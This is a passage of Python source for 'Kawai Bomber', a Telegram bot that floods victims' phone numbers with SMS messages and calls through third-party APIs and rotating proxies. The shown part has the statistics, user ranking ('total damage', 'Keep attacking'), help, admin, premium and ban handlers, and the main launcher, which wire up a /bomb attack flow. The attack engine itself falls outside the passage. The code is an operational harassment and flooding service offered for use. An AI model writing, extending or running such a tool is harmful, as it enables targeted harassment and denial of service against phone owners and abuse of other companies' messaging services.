    """Display bot statistics"""
    uptime = datetime.now() - bot_statistics["bot_uptime"]
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_display = f"{hours}h {minutes}m {seconds}s"
    
    # Calculate requests per minute
    total_requests = bot_statistics["total_sms_sent"] + bot_statistics["total_calls_made"]
    total_minutes = uptime.total_seconds() / 60
    rpm = total_requests / total_minutes if total_minutes > 0 else 0
    
    status_message = f"""
{EMOJIS['stats']} <b>📊 KAWAI BOMBER STATISTICS 📊</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['server']} <b>SYSTEM STATUS</b>
├─ {EMOJIS['clock']} <b>UPTIME:</b> {uptime_display}
├─ {EMOJIS['activity']} <b>ACTIVE ATTACKS:</b> {bot_statistics['active_attacks']}
├─ {EMOJIS['speed']} <b>REQUESTS/MIN:</b> {rpm:.1f}
└─ {EMOJIS['users']} <b>TOTAL USERS:</b> {bot_statistics['total_users']}

{EMOJIS['attack']} <b>ATTACK STATISTICS</b>
├─ {EMOJIS['sms']} <b>SMS SENT:</b> {bot_statistics['total_sms_sent']}
├─ {EMOJIS['call']} <b>CALLS MADE:</b> {bot_statistics['total_calls_made']}
├─ {EMOJIS['total']} <b>TOTAL HITS:</b> {bot_statistics['total_hits']}
└─ {EMOJIS['sessions']} <b>TOTAL SESSIONS:</b> {bot_statistics['total_sessions']}

{EMOJIS['proxy']} <b>PROXY SYSTEM</b>
├─ {EMOJIS['list']} <b>TOTAL PROXIES:</b> {proxy_manager.get_proxy_count()}
├─ {EMOJIS['working']} <b>WORKING:</b> {proxy_manager.get_proxy_count()}
└─ {EMOJIS['rotation']} <b>ROTATION:</b> Active

{EMOJIS['api']} <b>API ENDPOINTS</b>
├─ {EMOJIS['sms']} <b>SMS APIS:</b> {len([a for a in API_ENDPOINTS if a['type'] == 'sms'])}
├─ {EMOJIS['call']} <b>CALL APIS:</b> {len([a for a in API_ENDPOINTS if a['type'] == 'call'])}
└─ {EMOJIS['total']} <b>TOTAL APIS:</b> {len(API_ENDPOINTS)}

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
"""
    
    await update.message.reply_text(
        status_message,
        parse_mode=ParseMode.HTML
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display user statistics"""
    user_id = update.effective_user.id
    stats = user_statistics[user_id]
    
    total_attacks = stats["sms_count"] + stats["call_count"]
    
    # Calculate user rank
    if total_attacks == 0:
        rank = "🌱 NEWBIE"
    elif total_attacks < 50:
        rank = "🔥 TRAINEE"
    elif total_attacks < 200:
        rank = "⚡ WARRIOR"
    elif total_attacks < 500:
        rank = "💥 VETERAN"
    elif total_attacks < 1000:
        rank = "🌟 ELITE"
    else:
        rank = "👑 LEGEND"
    
    user_stats_message = f"""
{EMOJIS['sparkles']} <b>YOUR PROFILE</b> {EMOJIS['sparkles']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['user']} <b>USER INFO</b>
├─ {EMOJIS['rank']} <b>RANK:</b> {rank}
├─ {EMOJIS['level']} <b>LEVEL:</b> {total_attacks // 10 + 1}
├─ {EMOJIS['sessions']} <b>SESSIONS:</b> {stats['total_sessions']}
└─ {EMOJIS['status']} <b>STATUS:</b> {'Premium ⭐' if user_id in APPROVED_USERS else 'Free'}

{EMOJIS['attack']} <b>ATTACK HISTORY</b>
├─ {EMOJIS['sms']} <b>SMS SENT:</b> {stats['sms_count']}
├─ {EMOJIS['call']} <b>CALLS MADE:</b> {stats['call_count']}
├─ {EMOJIS['total']} <b>TOTAL HITS:</b> {total_attacks}
└─ {EMOJIS['damage']} <b>TOTAL DAMAGE:</b> {stats['total_hits']}

{EMOJIS['permissions']} <b>PERMISSIONS</b>
├─ {EMOJIS['admin']} <b>ADMIN:</b> {'✅ Yes' if user_id in ADMIN_IDS else '❌ No'}
├─ {EMOJIS['premium']} <b>PREMIUM:</b> {'✅ Yes' if user_id in APPROVED_USERS else '❌ No'}
├─ {EMOJIS['ban']} <b>BANNED:</b> {'✅ Yes' if user_id in BANNED_USERS else '❌ No'}
└─ {EMOJIS['limit']} <b>TIME LIMIT:</b> {'None ⭐' if user_id in APPROVED_USERS else '60 min'}

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['fire']} <i>Keep attacking to increase your rank!</i>
"""
    
    await update.message.reply_text(
        user_stats_message,
        parse_mode=ParseMode.HTML
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display help information"""
    help_message = f"""
{EMOJIS['help']} <b>KAWAI BOMBER HELP GUIDE</b> {EMOJIS['help']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['commands']} <b>AVAILABLE COMMANDS</b>
├─ /start - Start the bot
├─ /bomb - Launch attack
├─ /stop - Stop attack
├─ /status - View statistics
├─ /mystats - Your profile
└─ /help - This message

{EMOJIS['admin']} <b>ADMIN COMMANDS</b>
├─ /admin - Admin panel
├─ /addadmin <id> - Add admin
├─ /removeadmin <id> - Remove admin
├─ /approve <id> - Approve user
├─ /removeuser <id> - Remove approval
├─ /ban <id> - Ban user
├─ /unban <id> - Unban user
├─ /broadcast <msg> - Broadcast
└─ /sysinfo - System info

{EMOJIS['warning']} <b>IMPORTANT NOTES</b>
├─ Free users: 60-minute time limit
├─ Premium users: Unlimited attacks
├─ Use responsibly and ethically
└─ Respect local laws and regulations

{EMOJIS['features']} <b>FEATURES</b>
├─ Ultra-fast attack engine
├─ 40+ proxy rotation
├─ SMS & Call bombing
├─ Real-time statistics
├─ User ranking system
└─ Anime-inspired design

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>For support contact @zerocyph</i>
"""
    
    await update.message.reply_text(
        help_message,
        parse_mode=ParseMode.HTML
    )

# ==================== ADMIN COMMANDS ====================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>ACCESS DENIED!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    admin_panel_message = f"""
{EMOJIS['admin']} <b>ADMIN CONTROL PANEL</b> {EMOJIS['admin']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['stats']} <b>SYSTEM OVERVIEW</b>
├─ {EMOJIS['users']} <b>TOTAL USERS:</b> {len(USER_DATABASE)}
├─ {EMOJIS['active']} <b>ACTIVE ATTACKS:</b> {len(active_attacks)}
├─ {EMOJIS['approved']} <b>APPROVED USERS:</b> {len(APPROVED_USERS)}
└─ {EMOJIS['banned']} <b>BANNED USERS:</b> {len(BANNED_USERS)}

{EMOJIS['commands']} <b>ADMIN COMMANDS</b>
• /addadmin <id> - Add new admin
• /removeadmin <id> - Remove admin
• /approve <id> - Approve user (unlimited)
• /removeuser <id> - Remove approval
• /ban <id> - Ban user from bot
• /unban <id> - Unban user
• /broadcast <msg> - Send message to all
• /sysinfo - System information

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['warning']} <i>Use commands responsibly!</i>
"""
    
    await update.message.reply_text(
        admin_panel_message,
        parse_mode=ParseMode.HTML
    )

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /addadmin <user_id>"
        )
        return
    
    try:
        new_admin_id = int(context.args[0])
        ADMIN_IDS.add(new_admin_id)
        await update.message.reply_text(
            f"{EMOJIS['success']} <b>Admin added successfully!</b>\n\n"
            f"User {new_admin_id} is now an admin.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove admin user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /removeadmin <user_id>"
        )
        return
    
    try:
        admin_id = int(context.args[0])
        if admin_id != 8291098446:  # Cannot remove main admin
            ADMIN_IDS.discard(admin_id)
            await update.message.reply_text(
                f"{EMOJIS['success']} <b>Admin removed successfully!</b>\n\n"
                f"User {admin_id} is no longer an admin.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['error']} Cannot remove main admin!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve user (remove time limit)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /approve <user_id>"
        )
        return
    
    try:
        approve_id = int(context.args[0])
        APPROVED_USERS.add(approve_id)
        
        # Update user database
        if approve_id in USER_DATABASE:
            USER_DATABASE[approve_id]["is_premium"] = True
        
        await update.message.reply_text(
            f"{EMOJIS['success']} <b>User approved successfully!</b>\n\n"
            f"User {approve_id} now has unlimited attack time.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user approval"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /removeuser <user_id>"
        )
        return
    
    try:
        remove_id = int(context.args[0])
        if remove_id in APPROVED_USERS:
            APPROVED_USERS.remove(remove_id)
            
            # Update user database
            if remove_id in USER_DATABASE:
                USER_DATABASE[remove_id]["is_premium"] = False
            
            await update.message.reply_text(
                f"{EMOJIS['success']} <b>Approval removed successfully!</b>\n\n"
                f"User {remove_id} no longer has unlimited time.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['warning']} User was not approved!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban user from bot"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /ban <user_id>"
        )
        return
    
    try:
        ban_id = int(context.args[0])
        BANNED_USERS.add(ban_id)
        
        # Stop any active attacks
        if ban_id in active_attacks:
            del active_attacks[ban_id]
            bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
        
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>User banned successfully!</b>\n\n"
            f"User {ban_id} can no longer use the bot.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /unban <user_id>"
        )
        return
    
    try:
        unban_id = int(context.args[0])
        if unban_id in BANNED_USERS:
            BANNED_USERS.remove(unban_id)
            await update.message.reply_text(
                f"{EMOJIS['unban']} <b>User unbanned successfully!</b>\n\n"
                f"User {unban_id} can now use the bot again.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['warning']} User was not banned!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID format!"
        )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /broadcast <message>"
        )
        return
    
    message = " ".join(context.args)
    
    # In production, you would iterate through all users
    # For now, we'll just show a confirmation
    await update.message.reply_text(
        f"{EMOJIS['broadcast']} <b>BROADCAST PREPARED</b>\n\n"
        f"Message: {message}\n\n"
        f"Would be sent to {len(USER_DATABASE)} users.",
        parse_mode=ParseMode.HTML
    )

async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display system information"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    import platform
    import psutil
    
    # Get system info
    cpu_usage = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    
    sysinfo_message = f"""
{EMOJIS['server']} <b>SYSTEM INFORMATION</b> {EMOJIS['server']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['cpu']} <b>CPU USAGE:</b> {cpu_usage}%
{EMOJIS['memory']} <b>MEMORY:</b> {memory.percent}% ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)

{EMOJIS['os']} <b>OPERATING SYSTEM:</b> {platform.system()} {platform.release()}
{EMOJIS['python']} <b>PYTHON VERSION:</b> {platform.python_version()}

{EMOJIS['bot']} <b>BOT INFORMATION</b>
├─ {EMOJIS['users']} <b>USERS:</b> {len(USER_DATABASE)}
├─ {EMOJIS['active']} <b>ACTIVE:</b> {len(active_attacks)}
├─ {EMOJIS['proxies']} <b>PROXIES:</b> {proxy_manager.get_proxy_count()}
└─ {EMOJIS['apis']} <b>APIS:</b> {len(API_ENDPOINTS)}

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['time']} <i>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
"""
    
    await update.message.reply_text(
        sysinfo_message,
        parse_mode=ParseMode.HTML
    )

# ==================== BUTTON HANDLERS ====================
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "start_bombing":
        await bomb_command(update, context)
    elif data == "show_stats":
        await status_command(update, context)
    elif data == "show_help":
        await help_command(update, context)
    elif data == "user_settings":
        await mystats_command(update, context)
    elif data == "admin_dashboard":
        if user_id in ADMIN_IDS:
            await admin_command(update, context)
        else:
            await query.answer("Access denied!", show_alert=True)
    elif data == "confirm_attack":
        await handle_confirmation(update, context)
    elif data == "cancel_attack":
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>Operation cancelled!</b>",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel ongoing conversation"""
    await update.message.reply_text(
        f"{EMOJIS['success']} <b>Operation cancelled!</b>",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

# ==================== ERROR HANDLER ====================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bot errors"""
    try:
        raise context.error
    except Conflict:
        # This error occurs when another instance is running
        logger.error("Conflict: Another bot instance is running")
    except AttributeError as e:
        if "'NoneType' object has no attribute" in str(e):
            logger.error(f"Attribute error: {e}")
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        if update and update.effective_message:
            try:
                await update.effective_message.reply_text(
                    f"{EMOJIS['error']} <b>An error occurred!</b>\n"
                    f"Please try again later.",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass

# ==================== MAIN FUNCTION ====================
def main():
    """Start the bot"""
    print(BANNER)
    print(f"{EMOJIS['sparkles']} Kawai Bomber v3.0")
    print(f"{EMOJIS['heart']} Made by @zerocyph")
    print(f"{EMOJIS['power']} Powered by Python-Telegram-Bot")
    print(f"{EMOJIS['warning']} Starting bot...")
    
    # Validate token
    if not BOT_TOKEN or len(BOT_TOKEN) < 20:
        print(f"\n{EMOJIS['error']} ERROR: Invalid bot token!")
        print(f"Please set BOT_TOKEN environment variable.")
        sys.exit(1)
    
    # Create application with proper settings for Railway
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Create conversation handler with per_message=True to fix warning
    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_input)],
            CONFIRM: [CallbackQueryHandler(handle_confirmation, pattern="^(confirm_attack|cancel_attack)$")],
            BOMB_TYPE: [CallbackQueryHandler(handle_attack_type, pattern="^attack_")]
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
        per_message=True  # This fixes the warning
    )
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Add admin command handlers
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("sysinfo", sysinfo_command))
    
    # Add conversation handler
    application.add_handler(conversation_handler)
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start bot with proper settings for Railway
    print(f"\n{EMOJIS['rocket']} Bot is running...")
    print(f"{EMOJIS['star']} Press Ctrl+C to stop")
    
    try:
        # Run with polling and proper conflict handling
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,  # This helps with multiple instances
            close_loop=False  # Important for Railway
        )
    except Conflict as e:
        print(f"\n{EMOJIS['error']} CONFLICT ERROR: Another bot instance is running!")
        print("Please check if the bot is already running elsewhere.")
        print("Stopping this instance to avoid conflicts.")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{EMOJIS['success']} Bot stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n{EMOJIS['error']} FATAL ERROR: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
